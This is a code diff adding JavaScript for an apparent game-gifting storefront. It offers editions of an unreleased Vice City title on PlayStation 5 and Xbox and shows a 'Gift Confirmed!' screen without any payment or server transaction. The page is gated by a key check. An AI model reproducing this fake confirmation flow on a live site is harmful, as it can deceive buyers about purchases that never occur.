+  .catch(function(){setLoading(false);if(kv(k))unlock();else{keyInp.classList.add('error');msg.textContent='Validation server unreachable.';msg.className='error';}});
+};
+
+keyInp.addEventListener('keydown',function(e){if(e.key==='Enter')kgSubmit();});
+discInp.addEventListener('keydown',function(e){if(e.key==='Enter')kgSubmit();});
+setTimeout(function(){keyInp.focus();},300);
+
+// ═══════════ GIFTING FLOW ═══════════
+var EDS={standard:{name:'Standard Edition',price:69.99,perks:['Full base game','Pre-order bonus livery pack','Vice City starter outfit']},ultimate:{name:'Ultimate Edition',price:99.99,perks:['Full base game','Expansion pass (2 story drops)','Criminal Enterprise starter pack','Exclusive vehicles & weapons']},collector:{name:"Collector's Edition",price:250,perks:['Full base game','Play 1 day early','10 Shark Cards','Founder property','Premium wardrobe']}};
+var platform='ps5',edition=null,confirmUser=null;
+function fmt(v){return '\u00a3'+v.toFixed(2);}
+
+var gOv=document.createElement('div');
+gOv.style.cssText='display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.8);backdrop-filter:blur(6px);align-items:flex-start;justify-content:center;padding:24px 16px;overflow-y:auto';
+document.body.appendChild(gOv);
+var gW=document.createElement('div');
+gW.style.cssText='position:relative;width:100%;max-width:580px;margin:auto;opacity:0;transform:translateY(18px) scale(.96)';
+gOv.appendChild(gW);
+var gBx=document.createElement('div');
+gBx.style.cssText='width:100%;border-radius:12px;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,.7)';
+gW.appendChild(gBx);
+
+function gOpen(){gOv.style.display='flex';requestAnimationFrame(function(){gW.style.opacity='1';gW.style.transform='translateY(0) scale(1)';});}
+function gClose(){gW.style.opacity='0';gW.style.transform='translateY(18px) scale(.96)';setTimeout(function(){gOv.style.display='none';gBx.innerHTML='';},300);}
+gOv.addEventListener('click',function(e){if(e.target===gOv)gClose();});
+function gR(html){gBx.innerHTML=html;gW.style.opacity='1';gW.style.transform='translateY(0) scale(1)';}
+
+function gE(){
+  var isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10';
+  gR('<div style="background:'+bg+';font-family:inherit;padding:28px"><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Choose Edition</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">'+(isPS?'PlayStation 5':'Xbox Series X|S')+'</p><div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">'+
+    ['standard','ultimate','collector'].map(function(k){var e=EDS[k];return '<button onclick="gP(\''+k+'\')" style="border:1px solid '+(k==='ultimate'?ac:'rgba(255,255,255,.1)')+';border-radius:8px;padding:16px;background:'+(k==='ultimate'?'rgba(0,0,0,.5)':'rgba(255,255,255,.03)')+';cursor:pointer;text-align:left;color:#fff"><div style="font-weight:700;font-size:14px">'+e.name+'</div><div style="font-size:22px;font-weight:900;color:#F4A43A;margin:8px 0">'+fmt(e.price)+'</div><ul style="list-style:none;font-size:11px;color:rgba(255,255,255,.5);line-height:1.8">'+e.perks.map(function(p){return '<li>\u25cf '+p+'</li>';}).join('')+'</ul></button>';}).join('')+
+  '</div></div>');
+}
+window.gP=function(k){edition=k;gA();};
+
+function gA(){
+  var isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10',lb=isPS?'PSN ID':'Xbox Gamertag';
+  gR('<div style="background:'+bg+';font-family:inherit;padding:28px"><button onclick="gE()" style="background:none;border:none;color:rgba(255,255,255,.45);cursor:pointer;font-size:12px;margin-bottom:14px">\u2190 Back</button><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Enter '+lb+'</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">Gift '+EDS[edition].name+' to this profile.</p><input id="g-un" placeholder="Gamertag..." style="width:100%;padding:12px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:6px;color:#fff;font-size:14px;margin-bottom:12px" onkeydown="if(event.key===\'Enter\')gC()"><button onclick="gC()" style="width:100%;padding:14px;background:'+ac+';color:#fff;font-weight:700;border:none;border-radius:6px;cursor:pointer;font-size:14px">Continue \u2192</button></div>');
+}
+window.gE=gE;
+
+window.gC=function(){var i=document.getElementById('g-un');if(!i||!i.value.trim())return;confirmUser=i.value.trim();gS();};
+
+function gS(){
+  var e=EDS[edition],isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10';
+  gR('<div style="background:'+bg+';font-family:inherit;padding:28px"><button onclick="gA()" style="background:none;border:none;color:rgba(255,255,255,.45);cursor:pointer;font-size:12px;margin-bottom:14px">\u2190 Back</button><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Confirm Gift</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">Gifting <strong style="color:#fff">'+e.name+'</strong> to <strong style="color:#f5b528">'+confirmUser+'</strong> on '+(isPS?'PlayStation 5':'Xbox Series X|S')+'</p><div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:8px;padding:16px;margin-bottom:20px"><div style="display:flex;justify-content:space-between;color:rgba(255,255,255,.7);font-size:13px;margin-bottom:8px">'+e.name+'<span>'+fmt(e.price)+'</span></div><div style="display:flex;justify-content:space-between;font-size:16px;font-weight:900;color:#fff;border-top:1px solid rgba(255,255,255,.05);padding-top:12px">Total<span>'+fmt(e.price)+'</span></div></div><button onclick="gD()" style="width:100%;padding:15px;background:'+ac+';color:#fff;font-weight:800;border:none;border-radius:6px;cursor:pointer;font-size:15px">Confirm \u00b7 '+fmt(e.price)+'</button></div>');
+}
+window.gA=gA;
+
+function gD(){
+  var e=EDS[edition],isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d';
+  gR('<div style="background:'+bg+';font-family:inherit;padding:40px 28px;text-align:center"><div style="height:80px;width:80px;border-radius:50%;background:rgba(52,211,153,.1);border:2px solid #34d399;display:flex;align-items:center;justify-content:center;margin:0 auto;font-size:36px;color:#6ee7b7">\u2713</div><h2 style="color:#fff;font-size:22px;margin:18px 0 8px">Gift Confirmed!</h2><p style="color:rgba(255,255,255,.55);font-size:14px;max-width:300px;margin:0 auto 22px;line-height:1.6">'+e.name+' gifted to <strong style="color:#fff">'+confirmUser+'</strong> on '+(isPS?'PlayStation 5':'Xbox Series X|S')+'.</p><button onclick="gClose()" style="padding:12px 32px;background:#fff;color:#000;font-weight:700;border:none;border-radius:6px;cursor:pointer;font-size:14px">Done</button></div>');
+}
+
+// Wire up all buttons
+document.querySelectorAll('[data-platform]').forEach(function(el){
+  el.addEventListener('click',function(e){e.preventDefault();platform=el.dataset.platform;gOpen();gE();});
+});
 document.querySelectorAll('[data-edition-pick]').forEach(function(el){
-  el.addEventListener('click',function(e){e.preventDefault();platform='ps5';om();se();setTimeout(function(){window.pe(el.dataset.editionPick);},200);});
+  el.addEventListener('click',function(e){e.preventDefault();platform='ps5';gOpen();gE();setTimeout(function(){window.gP(el.dataset.editionPick);},200);});
 });
 
 // Countdown
